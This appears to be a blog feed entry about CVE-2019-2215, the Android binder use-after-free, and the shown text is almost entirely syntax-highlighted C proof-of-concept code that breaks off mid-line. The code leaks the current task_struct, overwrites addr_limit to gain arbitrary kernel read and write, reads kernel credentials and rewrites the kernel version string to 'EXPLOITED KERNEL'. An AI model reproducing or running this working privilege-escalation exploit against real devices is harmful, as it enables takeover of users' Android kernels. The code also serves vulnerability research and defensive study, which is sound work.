      <url>/2023/06/29/CVE-2019-2215-Android%E5%86%85%E6%A0%B8binder%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<ul><li><p>poc</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> we don&#x27;t cover the task_struct* here; we want to leave it uninitialized</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_SZ 0x190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) <span class="comment">//25</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAITQUEUE_OFFSET 0xA0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) <span class="comment">//10</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump_memory</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> byte_count)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> byte_offset_start = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (byte_count % <span class="number">16</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">&quot;hexdump_memory called with non-full line&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> byte_offset = byte_offset_start; byte_offset &lt; byte_offset_start + byte_count;</span><br><span class="line">          byte_offset += <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">char</span> *linep = line;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot;%08lx  &quot;</span>, byte_offset);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;</span><br><span class="line">      linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot;%02hhx &quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)buf[byte_offset + i]);</span><br><span class="line">    &#125;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot; |&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;</span><br><span class="line">      <span class="type">char</span> c = buf[byte_offset + i];</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">isalnum</span>(c) || <span class="built_in">ispunct</span>(c) || c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        *(linep++) = c;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *(linep++) = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(line);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> epfd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *dummy_page_4g_aligned;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> current_ptr;</span><br><span class="line"><span class="type">int</span> binder_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_task_struct</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class="line">  <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event)) err(<span class="number">1</span>, <span class="string">&quot;epoll_add&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line">  <span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (pipe(pipefd)) err(<span class="number">1</span>, <span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fcntl(pipefd[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>) != <span class="number">0x1000</span>) err(<span class="number">1</span>, <span class="string">&quot;pipe size&quot;</span>);</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> page_buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="comment">//if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, &quot;fill pipe&quot;);</span></span><br><span class="line"></span><br><span class="line">  <span class="type">pid_t</span> fork_ret = fork();</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">/* Child process */</span></span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Doing EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Finished EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// first page: dummy data</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipefd[<span class="number">0</span>], page_buffer, <span class="keyword">sizeof</span>(page_buffer)) != <span class="keyword">sizeof</span>(page_buffer)) err(<span class="number">1</span>, <span class="string">&quot;read full pipe&quot;</span>);</span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Finished write to FIFO.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//printf(&quot;PARENT: Calling READV\n&quot;);</span></span><br><span class="line">  ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">  b = writev(pipefd[<span class="number">1</span>], iovec_array, IOVEC_ARRAY_SZ);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;writev() returns 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)b);</span><br><span class="line">  <span class="comment">// second page: leaked data</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipefd[<span class="number">0</span>], page_buffer, <span class="keyword">sizeof</span>(page_buffer)) != <span class="keyword">sizeof</span>(page_buffer)) err(<span class="number">1</span>, <span class="string">&quot;read full pipe&quot;</span>);</span><br><span class="line">  <span class="comment">//hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;PARENT: Finished calling READV\n&quot;</span>);</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="keyword">if</span> (wait(&amp;status) != fork_ret) err(<span class="number">1</span>, <span class="string">&quot;wait&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_ptr = *(<span class="type">unsigned</span> <span class="type">long</span> *)(page_buffer + <span class="number">0xe8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current_ptr == 0x%lx\n&quot;</span>, current_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clobber_addr_limit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class="line">  <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event)) err(<span class="number">1</span>, <span class="string">&quot;epoll_add&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line">  <span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> second_write_chunk[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="comment">/* iov_len */</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment">/* iov_base (already used) */</span></span><br><span class="line">    <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>, <span class="comment">/* iov_len (already used) */</span></span><br><span class="line">    current_ptr + <span class="number">0x8</span>, <span class="comment">/* next iov_base (addr_limit) */</span></span><br><span class="line">    <span class="number">8</span>, <span class="comment">/* next iov_len (sizeof(addr_limit)) */</span></span><br><span class="line">    <span class="number">0xfffffffffffffffe</span> <span class="comment">/* value to write */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">1</span>; <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>; <span class="comment">/* iov_len of previous, then this element and next element */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xBEEFDEAD</span>;</span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len = <span class="number">8</span>; <span class="comment">/* should be correct from the start, kernel will sum up lengths when importing */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socks)) err(<span class="number">1</span>, <span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (write(socks[<span class="number">1</span>], <span class="string">&quot;X&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>) err(<span class="number">1</span>, <span class="string">&quot;write socket dummy byte&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">pid_t</span> fork_ret = fork();</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">/* Child process */</span></span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Doing EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Finished EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(socks[<span class="number">1</span>], second_write_chunk, <span class="keyword">sizeof</span>(second_write_chunk)) != <span class="keyword">sizeof</span>(second_write_chunk))</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">&quot;write second chunk to socket&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;</span><br><span class="line">    .msg_iov = iovec_array,</span><br><span class="line">    .msg_iovlen = IOVEC_ARRAY_SZ</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">int</span> recvmsg_result = recvmsg(socks[<span class="number">0</span>], &amp;msg, MSG_WAITALL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;recvmsg() returns %d, expected %lu\n&quot;</span>, recvmsg_result,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">long</span>)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +</span><br><span class="line">      iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len +</span><br><span class="line">      iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> kernel_rw_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *buf, <span class="type">unsigned</span> <span class="type">long</span> len)</span> &#123;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">&quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&quot;</span>, len);</span><br><span class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_write failed to load userspace buffer&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], (<span class="type">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_write failed to overwrite kernel memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *buf, <span class="type">unsigned</span> <span class="type">long</span> len)</span> &#123;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">&quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&quot;</span>, len);</span><br><span class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], (<span class="type">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_read failed to read kernel memory&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_read failed to write out to userspace&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">kernel_read_ulong</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> data;</span><br><span class="line">  kernel_read(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write_ulong</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">unsigned</span> <span class="type">long</span> data)</span> &#123;</span><br><span class="line">  kernel_write(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write_uint</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">unsigned</span> <span class="type">int</span> data)</span> &#123;</span><br><span class="line">  kernel_write(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64</span></span><br><span class="line"><span class="comment">// data from `pahole` on my own build with the same .config</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__task_struct__mm 0x520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__task_struct__cred 0x790</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__mm_struct__user_ns 0x300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__uts_namespace__name__version 0xc7</span></span><br><span class="line"><span class="comment">// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL__init_user_ns 0x202f2c8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL__init_task 0x20257d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL__init_uts_ns 0x20255c0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Starting POC\n&quot;</span>);</span><br><span class="line">  <span class="comment">//pin_to(0);</span></span><br><span class="line"></span><br><span class="line">  dummy_page_4g_aligned = mmap((<span class="type">void</span>*)<span class="number">0x100000000</span>UL, <span class="number">0x2000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dummy_page_4g_aligned != (<span class="type">void</span>*)<span class="number">0x100000000</span>UL)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;mmap 4g aligned&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pipe(kernel_rw_pipe)) err(<span class="number">1</span>, <span class="string">&quot;kernel_rw_pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line">  binder_fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDONLY); <span class="comment">//s1</span></span><br><span class="line">  epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">  leak_task_struct();</span><br><span class="line">  clobber_addr_limit();</span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;should have stable kernel R/W now\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* in case you want to do stuff with the creds, to show that you can get them: */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current-&gt;mm == 0x%lx\n&quot;</span>, current_mm);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current-&gt;mm-&gt;user_ns == 0x%lx\n&quot;</span>, current_user_ns);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kernel_base = current_user_ns - SYMBOL__init_user_ns;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;kernel base is 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">  <span class="keyword">if</span> (kernel_base &amp; <span class="number">0xfff</span>UL) errx(<span class="number">1</span>, <span class="string">&quot;bad kernel base (not 0x...000)&quot;</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> init_task = kernel_base + SYMBOL__init_task;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&amp;init_task == 0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;init_task.cred == 0x%lx\n&quot;</span>, init_task_cred);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current-&gt;cred == 0x%lx\n&quot;</span>, my_cred);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> init_uts_ns = kernel_base + SYMBOL__init_uts_ns;</span><br><span class="line">  <span class="type">char</span> new_uts_version[] = <span class="string">&quot;EXPLOITED KERNEL&quot;</span>;</span><br><span class="line">  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, <span class="keyword">sizeof</span>(new_uts_version));</span><br><span 